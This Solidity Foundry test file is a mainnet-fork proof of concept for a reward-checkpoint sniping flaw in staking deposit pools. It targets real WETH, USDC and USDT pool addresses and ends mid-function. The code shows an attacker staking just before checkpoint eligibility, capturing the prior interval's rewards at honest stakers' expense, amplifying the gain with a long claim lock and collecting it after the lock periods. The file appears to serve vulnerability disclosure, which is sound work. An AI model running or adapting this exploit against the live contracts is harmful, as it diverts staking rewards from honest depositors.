// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console2} from "forge-std/Test.sol";

interface IERC20Checkpoint {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDepositPoolCheckpoint {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_) external;
    function withdraw(uint256 rewardPoolIndex_, uint256 amount_) external;
    function claim(uint256 rewardPoolIndex_, address receiver_) external payable;
    function getLatestUserReward(uint256 rewardPoolIndex_, address user_) external view returns (uint256);
    function distributor() external view returns (address);
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    function rewardPoolsProtocolDetails(uint256)
        external
        view
        returns (
            uint128 withdrawLockPeriodAfterStake,
            uint128 claimLockPeriodAfterStake,
            uint128 claimLockPeriodAfterClaim,
            uint256 minimalStake,
            uint256 distributedRewards
        );
    function usersData(address user_, uint256 poolId_)
        external
        view
        returns (
            uint128 lastStake,
            uint256 deposited,
            uint256 rate,
            uint256 pendingRewards,
            uint128 claimLockStart,
            uint128 claimLockEnd,
            uint256 virtualDeposited,
            uint128 lastClaim,
            address referrer
        );
}

interface IRewardPoolCheckpoint {
    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_) external view returns (uint256);
}

interface IDistributorCheckpoint {
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function getDistributedRewards(uint256 rewardPoolIndex_, address depositPoolAddress_) external view returns (uint256);
    function rewardPool() external view returns (address);
    function rewardPoolLastCalculatedTimestamp(uint256 rewardPoolIndex_) external view returns (uint128);
    function minRewardsDistributePeriod() external view returns (uint256);
    function chainLinkDataConsumer() external view returns (address);
    function depositPoolAddresses(uint256 rewardPoolIndex_, uint256 index_) external view returns (address);
    function depositPools(uint256 rewardPoolIndex_, address depositPoolAddress_)
        external
        view
        returns (
            address token,
            string memory chainLinkPath,
            uint256 tokenPrice,
            uint256 deposited,
            uint256 lastUnderlyingBalance,
            uint8 strategy,
            address aToken,
            bool isExist
        );
}

/// @notice Pinned-mainnet-fork differential PoC for historical reward checkpoint sniping.
/// A stake shortly before lastCalculated + minPeriod is admitted before the prior interval is
/// checkpointed. The first eligible checkpoint then allocates the prior interval with the
/// attacker's new weight.
contract CheckpointSnipingPoC is Test {
    uint256 constant FORK_BLOCK = 25_869_553; // timestamp exactly deployed lastCalculated
    uint256 constant POOL_ID = 0;
    uint256 constant AMOUNT = 1_000 ether;
    uint256 constant LIVE_AMOUNT = 100 ether;
    uint256 constant USDC_ATTACK_AMOUNT = 1_000_000e6;
    uint256 constant USDT_ATTACK_AMOUNT = 1_000e6;
    uint256 constant NEXT_BLOCK_SECONDS = 12;
    uint256 constant RATE_PRECISION = 1e25;

    IDepositPoolCheckpoint constant WETH_POOL =
        IDepositPoolCheckpoint(0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384);
    IERC20Checkpoint constant WETH = IERC20Checkpoint(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IDepositPoolCheckpoint constant USDC_POOL =
        IDepositPoolCheckpoint(0x6cCE082851Add4c535352f596662521B4De4750E);
    IERC20Checkpoint constant USDC = IERC20Checkpoint(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IDepositPoolCheckpoint constant USDT_POOL =
        IDepositPoolCheckpoint(0x3B51989212BEdaB926794D6bf8e9E991218cf116);
    IERC20Checkpoint constant USDT = IERC20Checkpoint(0xdAC17F958D2ee523a2206206994597C13D831ec7);

    address honest = makeAddr("checkpoint-honest");
    address attacker = makeAddr("checkpoint-attacker");

    struct BranchResult {
        uint256 attackerReward;
        uint256 honestReward;
        uint256 wethPoolRewardDelta;
        uint256 totalVirtualAtSettlement;
    }

    struct LiveBranchResult {
        uint256 attackerReward;
        uint256 incumbentReward;
    }

    function setUp() public {
        vm.createSelectFork("eth", FORK_BLOCK);
    }

    function test_checkpointSniping() public {
        IDistributorCheckpoint distributor = IDistributorCheckpoint(WETH_POOL.distributor());
        uint128 lastCalculated = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
        uint256 minPeriod = distributor.minRewardsDistributePeriod();

        emit log_named_uint("fork timestamp", block.timestamp);
        emit log_named_uint("lastCalculated", lastCalculated);
        emit log_named_uint("min distribution period", minPeriod);
        assertEq(block.timestamp, lastCalculated, "fork not pinned at interval start");
        assertEq(minPeriod, 1 days, "deployed min period changed");

        // Controlled victim: present for the full interval.
        _stake(honest, AMOUNT);
        assertEq(WETH_POOL.getLatestUserReward(POOL_ID, honest), 0, "unexpected initial reward");

        uint256 branchSnapshot = vm.snapshotState();
        uint256 boundary = uint256(lastCalculated) + minPeriod;

        // Control: checkpoint old interval first, then let attacker join next block.
        BranchResult memory control = _runControl(distributor, boundary);

        // Attack: join one slot before checkpoint eligibility, then settle the old interval
        // after attacker weight entered denominator.
        require(vm.revertToState(branchSnapshot), "snapshot revert failed");
        BranchResult memory attack = _runAttack(distributor, boundary);

        uint256 attackerHistoricalGain = attack.attackerReward - control.attackerReward;
        uint256 honestLoss = control.honestReward - attack.honestReward;
        uint256 totalProtocolEmissionWhileAttackerStaked = IRewardPoolCheckpoint(distributor.rewardPool())
            .getPeriodRewards(
                POOL_ID,
                uint128(boundary - NEXT_BLOCK_SECONDS),
                uint128(boundary + NEXT_BLOCK_SECONDS)
            );

        emit log_named_decimal_uint("control attacker historical MOR", control.attackerReward, 18);
        emit log_named_decimal_uint("attack attacker historical MOR", attack.attackerReward, 18);
        emit log_named_decimal_uint("ATTACKER HISTORICAL GAIN MOR", attackerHistoricalGain, 18);
        emit log_named_decimal_uint(
            "max protocol emission while attacker staked",
            totalProtocolEmissionWhileAttackerStaked,
            18
        );
        emit log_named_decimal_uint("control honest MOR", control.honestReward, 18);
        emit log_named_decimal_uint("attack honest MOR", attack.honestReward, 18);
        emit log_named_decimal_uint("HONEST LOSS MOR", honestLoss, 18);
        emit log_named_decimal_uint("control WETH-pool reward delta", control.wethPoolRewardDelta, 18);
        emit log_named_decimal_uint("attack WETH-pool reward delta", attack.wethPoolRewardDelta, 18);
        emit log_named_decimal_uint("control virtual weight at settlement", control.totalVirtualAtSettlement, 18);
        emit log_named_decimal_uint("attack virtual weight at settlement", attack.totalVirtualAtSettlement, 18);

        assertEq(control.attackerReward, 0, "control attacker received pre-stake reward");
        assertGt(attack.attackerReward, 0, "attack captured no historical reward");
        assertGt(
            attack.attackerReward,
            totalProtocolEmissionWhileAttackerStaked,
            "attacker reward could be explained by post-stake emission"
        );
        assertGt(control.honestReward, attack.honestReward, "full-period staker suffered no loss");
        assertGt(attackerHistoricalGain, honestLoss, "unexpected differential shape");
        assertGt(attack.totalVirtualAtSettlement, control.totalVirtualAtSettlement, "attacker weight not admitted early");

        // Collectability and capital-cost check. No long claim multiplier is used.
        // Deployed WETH pool locks stake withdrawals/claims for seven days.
        (uint128 withdrawLock, uint128 claimLockAfterStake,,, ) = WETH_POOL.rewardPoolsProtocolDetails(POOL_ID);
        assertEq(withdrawLock, 7 days, "withdraw lock changed");
        assertEq(claimLockAfterStake, 7 days, "claim lock changed");

        vm.warp(boundary + withdrawLock + 1);
        _refreshChainlinkTimestamps(distributor);
        uint256 principalBefore = WETH.balanceOf(attacker);
        vm.prank(attacker);
        WETH_POOL.withdraw(POOL_ID, type(uint256).max);
        uint256 principalReturned = WETH.balanceOf(attacker) - principalBefore;
        emit log_named_decimal_uint("principal returned after 7d", principalReturned, 18);
        assertGe(principalReturned, AMOUNT - 10, "principal not returned");

        (,,, uint256 pendingBeforeClaim,,,,,) = WETH_POOL.usersData(attacker, POOL_ID);
        assertGe(pendingBeforeClaim, attack.attackerReward, "historical reward not preserved");
        vm.deal(attacker, 0.1 ether);
        vm.prank(attacker);
        WETH_POOL.claim{value: 0.05 ether}(POOL_ID, attacker);
        (,,, uint256 pendingAfterClaim,,,,,) = WETH_POOL.usersData(attacker, POOL_ID);
        assertEq(pendingAfterClaim, 0, "claim did not clear pending reward");
        emit log("CLAIM SUCCEEDED: historical reward reached production mint-message path");
    }

    function test_poolMatrix() public {
        IDistributorCheckpoint distributor = IDistributorCheckpoint(WETH_POOL.distributor());
        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
            distributor.minRewardsDistributePeriod();
        address[5] memory pools = [
            address(0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790),
            address(0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384),
            address(0xdE283F8309Fd1AA46c95d299f6B8310716277A42),
            address(0x6cCE082851Add4c535352f596662521B4De4750E),
            address(0x3B51989212BEdaB926794D6bf8e9E991218cf116)
        ];
        uint256[5] memory beforeRewards;
        for (uint256 i; i < pools.length; i++) {
            beforeRewards[i] = distributor.getDistributedRewards(POOL_ID, pools[i]);
        }

        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);
        distributor.distributeRewards(POOL_ID);

        for (uint256 i; i < pools.length; i++) {
            (,, uint256 virtualWeight) = IDepositPoolCheckpoint(pools[i]).rewardPoolsData(POOL_ID);
            uint256 dailyReward = distributor.getDistributedRewards(POOL_ID, pools[i]) - beforeRewards[i];
            emit log_named_address("pool", pools[i]);
            emit log_named_decimal_uint("incumbent virtual weight raw token units", virtualWeight, 18);
            emit log_named_decimal_uint("checkpoint MOR allocation", dailyReward, 18);
        }
    }

    function test_liveStateImpact() public {
        IDistributorCheckpoint distributor = IDistributorCheckpoint(WETH_POOL.distributor());
        uint128 lastCalculated = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
        uint256 boundary = uint256(lastCalculated) + distributor.minRewardsDistributePeriod();
        (,, uint256 incumbentVirtualWeight) = WETH_POOL.rewardPoolsData(POOL_ID);
        uint256 initialRate = _currentPoolRate(distributor);
        uint256 stateSnapshot = vm.snapshotState();

        LiveBranchResult memory control =
            _runLiveControl(distributor, boundary, initialRate, incumbentVirtualWeight);

        // Attack: same deployed state; attacker enters one slot before checkpoint eligibility.
        require(vm.revertToState(stateSnapshot), "snapshot revert failed");
        LiveBranchResult memory attack =
            _runLiveAttack(distributor, boundary, initialRate, incumbentVirtualWeight);
        uint256 incumbentLoss = control.incumbentReward - attack.incumbentReward;
        uint256 totalEmissionWhileStaked = IRewardPoolCheckpoint(distributor.rewardPool()).getPeriodRewards(
            POOL_ID,
            uint128(boundary - NEXT_BLOCK_SECONDS),
            uint128(boundary + NEXT_BLOCK_SECONDS)
        );

        emit log_named_decimal_uint("deployed incumbent virtual weight", incumbentVirtualWeight, 18);
        emit log_named_decimal_uint("live attack capital WETH", LIVE_AMOUNT, 18);
        emit log_named_decimal_uint("live control attacker MOR", control.attackerReward, 18);
        emit log_named_decimal_uint("LIVE ATTACKER HISTORICAL GAIN MOR", attack.attackerReward, 18);
        emit log_named_decimal_uint("live control incumbent MOR", control.incumbentReward, 18);
        emit log_named_decimal_uint("live attack incumbent MOR", attack.incumbentReward, 18);
        emit log_named_decimal_uint("LIVE INCUMBENT LOSS MOR", incumbentLoss, 18);
        emit log_named_decimal_uint("max protocol emission while attacker staked", totalEmissionWhileStaked, 18);

        assertEq(control.attackerReward, 0, "control attacker received historical reward");
        assertGt(attack.attackerReward, totalEmissionWhileStaked, "historical capture not proven");
        assertGt(control.incumbentReward, attack.incumbentReward, "deployed incumbents lost nothing");
        assertGt(incumbentLoss, 0, "zero deployed-state impact");
    }

    function test_usdcLiveStateImpactAndCollectability() public {
        IDistributorCheckpoint distributor = IDistributorCheckpoint(USDC_POOL.distributor());
        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
            distributor.minRewardsDistributePeriod();
        (,, uint256 incumbentVirtualWeight) = USDC_POOL.rewardPoolsData(POOL_ID);
        uint256 initialRate = _currentPoolRateFor(USDC_POOL, distributor);
        uint256 stateSnapshot = vm.snapshotState();

        LiveBranchResult memory control =
            _runUSDCControl(distributor, boundary, initialRate, incumbentVirtualWeight);

        require(vm.revertToState(stateSnapshot), "snapshot revert failed");
        LiveBranchResult memory attack =
            _runUSDCAttack(distributor, boundary, initialRate, incumbentVirtualWeight);
        uint256 incumbentLoss = control.incumbentReward - attack.incumbentReward;
        uint256 emissionWhileStaked = IRewardPoolCheckpoint(distributor.rewardPool()).getPeriodRewards(
            POOL_ID,
            uint128(boundary - NEXT_BLOCK_SECONDS),
            uint128(boundary + NEXT_BLOCK_SECONDS)
        );

        emit log_named_decimal_uint("USDC incumbent virtual weight", incumbentVirtualWeight, 6);
        emit log_named_decimal_uint("USDC attack capital", USDC_ATTACK_AMOUNT, 6);
        emit log_named_decimal_uint("USDC control attacker MOR", control.attackerReward, 18);
        emit log_named_decimal_uint("USDC ATTACKER HISTORICAL GAIN MOR", attack.attackerReward, 18);
        emit log_named_decimal_uint("USDC control incumbent MOR", control.incumbentReward, 18);
        emit log_named_decimal_uint("USDC attack incumbent MOR", attack.incumbentReward, 18);
        emit log_named_decimal_uint("USDC INCUMBENT LOSS MOR", incumbentLoss, 18);
        emit log_named_decimal_uint("max protocol emission while attacker staked", emissionWhileStaked, 18);

        assertEq(control.attackerReward, 0, "control attacker received old reward");
        assertGt(attack.attackerReward, emissionWhileStaked, "USDC historical capture not proven");
        assertGt(control.incumbentReward, attack.incumbentReward, "USDC incumbents lost nothing");

        _proveUSDCCollectability(distributor, boundary, attack.attackerReward, USDC_ATTACK_AMOUNT);
    }

    function test_usdcCapitalCurveAndExactBoundary() public {
        uint256[3] memory amounts = [uint256(100_000e6), uint256(1_000_000e6), uint256(10_000_000e6)];

        for (uint256 i; i < amounts.length; i++) {
            vm.createSelectFork("eth", FORK_BLOCK);
            IDistributorCheckpoint distributor = IDistributorCheckpoint(USDC_POOL.distributor());
            uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
                distributor.minRewardsDistributePeriod();
            (,, uint256 incumbentVirtualWeight) = USDC_POOL.rewardPoolsData(POOL_ID);
            uint256 initialRate = _currentPoolRateFor(USDC_POOL, distributor);
            uint256 stateSnapshot = vm.snapshotState();

            LiveBranchResult memory control =
                _runUSDCControlAmount(distributor, boundary, initialRate, incumbentVirtualWeight, amounts[i]);

            require(vm.revertToState(stateSnapshot), "curve snapshot revert failed");
            LiveBranchResult memory attack = _runUSDCAttackAmount(
                distributor,
                boundary,
                initialRate,
                incumbentVirtualWeight,
                amounts[i],
                boundary
            );

            uint256 incumbentLoss = control.incumbentReward - attack.incumbentReward;
            uint256 emissionWhileStaked = IRewardPoolCheckpoint(distributor.rewardPool()).getPeriodRewards(
                POOL_ID,
                uint128(boundary),
                uint128(boundary + NEXT_BLOCK_SECONDS)
            );

            emit log_named_decimal_uint("curve USDC capital", amounts[i], 6);
            emit log_named_decimal_uint("curve attacker historical MOR", attack.attackerReward, 18);
            emit log_named_decimal_uint("curve incumbent loss MOR", incumbentLoss, 18);
            emit log_named_decimal_uint("curve max emission while staked MOR", emissionWhileStaked, 18);

            assertEq(control.attackerReward, 0, "curve control got historical reward");
            assertGt(attack.attackerReward, emissionWhileStaked, "curve historical capture not proven");
            assertGt(incumbentLoss, 0, "curve incumbent loss missing");

            if (i == amounts.length - 1) {
                _proveUSDCCollectability(distributor, boundary, attack.attackerReward, amounts[i]);
            }
        }
    }

    function test_usdcFreshLockAmplifierAndCollectability() public {
        uint256 amount = 100_000e6;
        IDistributorCheckpoint distributor = IDistributorCheckpoint(USDC_POOL.distributor());
        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
            distributor.minRewardsDistributePeriod();
        uint256 stateSnapshot = vm.snapshotState();

        LiveBranchResult memory baseline = _runUSDCAttackAmount(
            distributor,
            boundary,
            _currentPoolRateFor(USDC_POOL, distributor),
            _usdcIncumbentWeight(),
            amount,
            boundary
        );

        require(vm.revertToState(stateSnapshot), "fresh-lock snapshot revert failed");
        uint128 claimLockEnd = uint128(boundary + 365 days);
        vm.warp(boundary);
        uint128 checkpointBefore = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
        _stakeTokenWithOptions(attacker, USDC, USDC_POOL, amount, claimLockEnd, address(0));
        assertEq(
            distributor.rewardPoolLastCalculatedTimestamp(POOL_ID),
            checkpointBefore,
            "fresh-lock entry unexpectedly checkpointed"
        );
        (,,,,,, uint256 lockedVirtual,,) = USDC_POOL.usersData(attacker, POOL_ID);

        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);
        distributor.distributeRewards(POOL_ID);
        uint256 lockedReward = USDC_POOL.getLatestUserReward(POOL_ID, attacker);

        emit log_named_decimal_uint("fresh-lock USDC principal", amount, 6);
        emit log_named_decimal_uint("fresh-lock virtual weight", lockedVirtual, 6);
        emit log_named_decimal_uint("fresh-lock effective multiplier", (lockedVirtual * 1e18) / amount, 18);
        emit log_named_decimal_uint("baseline historical MOR", baseline.attackerReward, 18);
        emit log_named_decimal_uint("fresh-lock historical MOR", lockedReward, 18);
        emit log_named_decimal_uint("fresh-lock amplification MOR", lockedReward - baseline.attackerReward, 18);

        assertGt(lockedVirtual, amount, "fresh lock produced no weight amplifier");
        assertGt(lockedReward, baseline.attackerReward, "fresh lock did not amplify historical capture");

        (uint128 withdrawLock,,,,) = USDC_POOL.rewardPoolsProtocolDetails(POOL_ID);
        vm.warp(boundary + withdrawLock + 1);
        _refreshChainlinkTimestamps(distributor);
        uint256 principalBefore = USDC.balanceOf(attacker);
        vm.prank(attacker);
        USDC_POOL.withdraw(POOL_ID, type(uint256).max);
        uint256 principalReturned = USDC.balanceOf(attacker) - principalBefore;
        assertGe(principalReturned, amount - 10, "fresh-lock principal not returned after 7d");
        (,,, uint256 pendingAfterWithdraw,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
        assertGe(pendingAfterWithdraw, lockedReward, "fresh-lock reward not preserved after withdrawal");

        vm.warp(uint256(claimLockEnd) + 1);
        _refreshChainlinkTimestamps(distributor);
        vm.deal(attacker, 0.1 ether);
        vm.prank(attacker);
        USDC_POOL.claim{value: 0.05 ether}(POOL_ID, attacker);
        (,,, uint256 pendingAfterClaim,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
        assertEq(pendingAfterClaim, 0, "fresh-lock reward not collectible after expiry");
        emit log("FRESH-LOCK CLAIM SUCCEEDED: amplified historical reward reached mint-message path");
    }

    function _usdcIncumbentWeight() private view returns (uint256 weight) {
        (,, weight) = USDC_POOL.rewardPoolsData(POOL_ID);
    }

    function test_usdtLowCapitalImpactAndCollectability() public {
        IDistributorCheckpoint distributor = IDistributorCheckpoint(USDT_POOL.distributor());
        uint256 boundary = uint256(distributor.rewardPoolLastCalculatedTimestamp(POOL_ID)) +
            distributor.minRewardsDistributePeriod();
        (,, uint256 incumbentVirtualWeight) = USDT_POOL.rewardPoolsData(POOL_ID);
        uint256 initialRate = _currentPoolRateFor(USDT_POOL, distributor);
        uint256 stateSnapshot = vm.snapshotState();

        LiveBranchResult memory control =
            _runUSDTControl(distributor, boundary, initialRate, incumbentVirtualWeight);
        require(vm.revertToState(stateSnapshot), "snapshot revert failed");
        LiveBranchResult memory attack =
            _runUSDTAttack(distributor, boundary, initialRate, incumbentVirtualWeight);

        uint256 incumbentLoss = control.incumbentReward - attack.incumbentReward;
        uint256 emissionWhileStaked = IRewardPoolCheckpoint(distributor.rewardPool()).getPeriodRewards(
            POOL_ID,
            uint128(boundary - NEXT_BLOCK_SECONDS),
            uint128(boundary + NEXT_BLOCK_SECONDS)
        );

        emit log_named_decimal_uint("USDT incumbent virtual weight", incumbentVirtualWeight, 6);
        emit log_named_decimal_uint("USDT attack capital", USDT_ATTACK_AMOUNT, 6);
        emit log_named_decimal_uint("USDT control attacker MOR", control.attackerReward, 18);
        emit log_named_decimal_uint("USDT ATTACKER HISTORICAL GAIN MOR", attack.attackerReward, 18);
        emit log_named_decimal_uint("USDT control incumbent MOR", control.incumbentReward, 18);
        emit log_named_decimal_uint("USDT attack incumbent MOR", attack.incumbentReward, 18);
        emit log_named_decimal_uint("USDT INCUMBENT LOSS MOR", incumbentLoss, 18);
        emit log_named_decimal_uint("max protocol emission while attacker staked", emissionWhileStaked, 18);

        assertEq(control.attackerReward, 0, "USDT control attacker received old reward");
        assertGt(attack.attackerReward, emissionWhileStaked, "USDT historical capture not proven");
        assertGt(control.incumbentReward, attack.incumbentReward, "USDT incumbents lost nothing");

        (uint128 withdrawLock, uint128 claimLockAfterStake,,, ) = USDT_POOL.rewardPoolsProtocolDetails(POOL_ID);
        assertEq(withdrawLock, 7 days, "USDT withdraw lock changed");
        assertEq(claimLockAfterStake, 7 days, "USDT claim lock changed");
        vm.warp(boundary + withdrawLock + 1);
        _refreshChainlinkTimestamps(distributor);

        uint256 principalBefore = USDT.balanceOf(attacker);
        vm.prank(attacker);
        USDT_POOL.withdraw(POOL_ID, type(uint256).max);
        uint256 principalReturned = USDT.balanceOf(attacker) - principalBefore;
        emit log_named_decimal_uint("USDT principal returned after 7d", principalReturned, 6);
        assertGe(principalReturned, USDT_ATTACK_AMOUNT - 10, "USDT principal not returned");

        (,,, uint256 pendingBeforeClaim,,,,,) = USDT_POOL.usersData(attacker, POOL_ID);
        assertGe(pendingBeforeClaim, attack.attackerReward, "USDT historical reward not preserved");
        vm.deal(attacker, 0.1 ether);
        vm.prank(attacker);
        USDT_POOL.claim{value: 0.05 ether}(POOL_ID, attacker);
        (,,, uint256 pendingAfterClaim,,,,,) = USDT_POOL.usersData(attacker, POOL_ID);
        assertEq(pendingAfterClaim, 0, "USDT claim did not clear pending reward");
        emit log("USDT CLAIM SUCCEEDED: historical reward reached production mint-message path");
    }

    function _runUSDTControl(
        IDistributorCheckpoint distributor,
        uint256 boundary,
        uint256 initialRate,
        uint256 incumbentVirtualWeight
    ) private returns (LiveBranchResult memory result) {
        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);
        distributor.distributeRewards(POOL_ID);
        _stakeToken(attacker, USDT, USDT_POOL, USDT_ATTACK_AMOUNT);
        uint256 rate = _currentPoolRateFor(USDT_POOL, distributor);
        result.attackerReward = USDT_POOL.getLatestUserReward(POOL_ID, attacker);
        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
    }

    function _runUSDTAttack(
        IDistributorCheckpoint distributor,
        uint256 boundary,
        uint256 initialRate,
        uint256 incumbentVirtualWeight
    ) private returns (LiveBranchResult memory result) {
        vm.warp(boundary - NEXT_BLOCK_SECONDS);
        _stakeToken(attacker, USDT, USDT_POOL, USDT_ATTACK_AMOUNT);
        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);
        distributor.distributeRewards(POOL_ID);
        uint256 rate = _currentPoolRateFor(USDT_POOL, distributor);
        result.attackerReward = USDT_POOL.getLatestUserReward(POOL_ID, attacker);
        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
    }

    function _proveUSDCCollectability(
        IDistributorCheckpoint distributor,
        uint256 boundary,
        uint256 attackReward,
        uint256 principalAmount
    ) private {
        (uint128 withdrawLock, uint128 claimLockAfterStake,,, ) = USDC_POOL.rewardPoolsProtocolDetails(POOL_ID);
        assertEq(withdrawLock, 7 days, "USDC withdraw lock changed");
        assertEq(claimLockAfterStake, 7 days, "USDC claim lock changed");
        vm.warp(boundary + withdrawLock + 1);
        _refreshChainlinkTimestamps(distributor);

        uint256 principalBefore = USDC.balanceOf(attacker);
        vm.prank(attacker);
        USDC_POOL.withdraw(POOL_ID, type(uint256).max);
        uint256 principalReturned = USDC.balanceOf(attacker) - principalBefore;
        emit log_named_decimal_uint("USDC principal returned after 7d", principalReturned, 6);
        assertGe(principalReturned, principalAmount - 10, "USDC principal not returned");

        (,,, uint256 pendingBeforeClaim,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
        assertGe(pendingBeforeClaim, attackReward, "USDC historical reward not preserved");
        vm.deal(attacker, 0.1 ether);
        vm.prank(attacker);
        USDC_POOL.claim{value: 0.05 ether}(POOL_ID, attacker);
        (,,, uint256 pendingAfterClaim,,,,,) = USDC_POOL.usersData(attacker, POOL_ID);
        assertEq(pendingAfterClaim, 0, "USDC claim did not clear pending reward");
        emit log("USDC CLAIM SUCCEEDED: historical reward reached production mint-message path");
    }

    function _runUSDCControl(
        IDistributorCheckpoint distributor,
        uint256 boundary,
        uint256 initialRate,
        uint256 incumbentVirtualWeight
    ) private returns (LiveBranchResult memory result) {
        return _runUSDCControlAmount(
            distributor,
            boundary,
            initialRate,
            incumbentVirtualWeight,
            USDC_ATTACK_AMOUNT
        );
    }

    function _runUSDCControlAmount(
        IDistributorCheckpoint distributor,
        uint256 boundary,
        uint256 initialRate,
        uint256 incumbentVirtualWeight,
        uint256 amount
    ) private returns (LiveBranchResult memory result) {
        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);
        distributor.distributeRewards(POOL_ID);
        _stakeToken(attacker, USDC, USDC_POOL, amount);
        uint256 rate = _currentPoolRateFor(USDC_POOL, distributor);
        result.attackerReward = USDC_POOL.getLatestUserReward(POOL_ID, attacker);
        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
    }

    function _runUSDCAttack(
        IDistributorCheckpoint distributor,
        uint256 boundary,
        uint256 initialRate,
        uint256 incumbentVirtualWeight
    ) private returns (LiveBranchResult memory result) {
        return _runUSDCAttackAmount(
            distributor,
            boundary,
            initialRate,
            incumbentVirtualWeight,
            USDC_ATTACK_AMOUNT,
            boundary - NEXT_BLOCK_SECONDS
        );
    }

    function _runUSDCAttackAmount(
        IDistributorCheckpoint distributor,
        uint256 boundary,
        uint256 initialRate,
        uint256 incumbentVirtualWeight,
        uint256 amount,
        uint256 entryTimestamp
    ) private returns (LiveBranchResult memory result) {
        vm.warp(entryTimestamp);
        uint128 checkpointBefore = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
        _stakeToken(attacker, USDC, USDC_POOL, amount);
        assertEq(
            distributor.rewardPoolLastCalculatedTimestamp(POOL_ID),
            checkpointBefore,
            "USDC entry unexpectedly settled historical interval"
        );
        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);
        distributor.distributeRewards(POOL_ID);
        uint256 rate = _currentPoolRateFor(USDC_POOL, distributor);
        result.attackerReward = USDC_POOL.getLatestUserReward(POOL_ID, attacker);
        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
    }

    function _runLiveControl(
        IDistributorCheckpoint distributor,
        uint256 boundary,
        uint256 initialRate,
        uint256 incumbentVirtualWeight
    ) private returns (LiveBranchResult memory result) {
        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);
        distributor.distributeRewards(POOL_ID);
        _stake(attacker, LIVE_AMOUNT);
        uint256 rate = _currentPoolRate(distributor);
        result.attackerReward = WETH_POOL.getLatestUserReward(POOL_ID, attacker);
        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
    }

    function _runLiveAttack(
        IDistributorCheckpoint distributor,
        uint256 boundary,
        uint256 initialRate,
        uint256 incumbentVirtualWeight
    ) private returns (LiveBranchResult memory result) {
        vm.warp(boundary - NEXT_BLOCK_SECONDS);
        _stake(attacker, LIVE_AMOUNT);
        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);
        distributor.distributeRewards(POOL_ID);
        uint256 rate = _currentPoolRate(distributor);
        result.attackerReward = WETH_POOL.getLatestUserReward(POOL_ID, attacker);
        result.incumbentReward = ((rate - initialRate) * incumbentVirtualWeight) / RATE_PRECISION;
    }

    function _runControl(
        IDistributorCheckpoint distributor,
        uint256 boundary
    ) private returns (BranchResult memory result) {
        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);

        uint256 distributedBefore = distributor.getDistributedRewards(POOL_ID, address(WETH_POOL));
        distributor.distributeRewards(POOL_ID);
        uint256 distributedAfter = distributor.getDistributedRewards(POOL_ID, address(WETH_POOL));
        result.wethPoolRewardDelta = distributedAfter - distributedBefore;
        (,, result.totalVirtualAtSettlement) = WETH_POOL.rewardPoolsData(POOL_ID);

        _stake(attacker, AMOUNT);
        result.attackerReward = WETH_POOL.getLatestUserReward(POOL_ID, attacker);
        result.honestReward = WETH_POOL.getLatestUserReward(POOL_ID, honest);
    }

    function _runAttack(
        IDistributorCheckpoint distributor,
        uint256 boundary
    ) private returns (BranchResult memory result) {
        // Stake one normal Ethereum slot before checkpoint eligibility. This removes any
        // dependence on the exact equality boundary: the core bug is mutable stake weight
        // during the still-uncheckpointed interval.
        vm.warp(boundary - NEXT_BLOCK_SECONDS);
        uint128 lastBefore = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
        _stake(attacker, AMOUNT);
        uint128 lastAfterStake = distributor.rewardPoolLastCalculatedTimestamp(POOL_ID);
        assertEq(lastAfterStake, lastBefore, "boundary unexpectedly checkpointed");
        assertEq(WETH_POOL.getLatestUserReward(POOL_ID, attacker), 0, "reward existed before checkpoint");

        vm.warp(boundary + NEXT_BLOCK_SECONDS);
        _refreshChainlinkTimestamps(distributor);
        uint256 distributedBefore = distributor.getDistributedRewards(POOL_ID, address(WETH_POOL));
        distributor.distributeRewards(POOL_ID);
        uint256 distributedAfter = distributor.getDistributedRewards(POOL_ID, address(WETH_POOL));
        result.wethPoolRewardDelta = distributedAfter - distributedBefore;
        (,, result.totalVirtualAtSettlement) = WETH_POOL.rewardPoolsData(POOL_ID);

